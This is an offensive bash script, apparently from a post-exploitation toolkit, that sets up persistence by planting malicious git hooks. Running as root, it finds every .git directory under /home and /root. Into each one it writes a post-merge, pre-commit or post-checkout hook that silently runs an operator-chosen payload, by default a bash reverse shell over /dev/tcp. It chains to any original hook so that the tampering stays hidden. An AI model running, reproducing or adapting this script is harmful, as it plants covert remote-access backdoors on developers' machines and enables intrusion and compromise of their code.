#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] Git Hooks Persistence [*] "
echo ""
echo "This plants malicious git hooks in repositories found on the system."
echo "Hooks fire on git pull (post-merge), git commit (pre-commit), etc."
echo ""

read -p "Enter your payload or command (or leave empty for reverse shell): " payload

if [ -z "$payload" ]; then
    read -p "Enter the IP address: " ip
    read -p "Enter the port: " port
    payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
fi

echo ""
echo "Select hook type:"
echo "  [1] post-merge  (fires on git pull) [recommended]"
echo "  [2] pre-commit  (fires on git commit)"
echo "  [3] post-checkout (fires on git checkout)"
read -p "Choice (default: 1): " hook_choice

case "$hook_choice" in
    2) hook_name="pre-commit" ;;
    3) hook_name="post-checkout" ;;
    *) hook_name="post-merge" ;;
esac

echo ""
echo "[*] Scanning for git repositories in /home/ and /root/ ..."
repos=$(find /home/ /root/ -name ".git" -type d 2>/dev/null)

if [ -z "$repos" ]; then
    echo "[!] No git repositories found. Enter a path manually."
    read -p "Enter the full path to a .git directory: " manual_git
    if [ -d "$manual_git" ]; then
        repos="$manual_git"
    else
        echo "[ERROR] Invalid path." >&2
        exit 1
    fi
fi

count=0

for gitdir in $repos; do
    hooks_dir="$gitdir/hooks"
    hook_file="$hooks_dir/$hook_name"

    mkdir -p "$hooks_dir"

    # Preserve existing hook if present
    if [ -f "$hook_file" ] && ! grep -q "d3m0n1z3d" "$hook_file"; then
        mv "$hook_file" "${hook_file}.d3m0n_orig"
    fi

    cat > "$hook_file" <<HOOKEOF
#!/bin/bash
# d3m0n1z3d
nohup $payload &>/dev/null &
HOOKEOF

    # Call original hook if it was preserved
    if [ -f "${hook_file}.d3m0n_orig" ]; then
        echo "bash \"${hook_file}.d3m0n_orig\" \"\$@\"" >> "$hook_file"
    fi

    chmod +x "$hook_file"
    echo "[+] Infected: $gitdir ($hook_name)"
    count=$((count + 1))
done

clear

echo "[*] Success!! Git hooks persistence planted in $count repository(ies). [*]"
echo "[*] Hook: $hook_name — triggers on corresponding git operation [*]"

sleep 1

clear
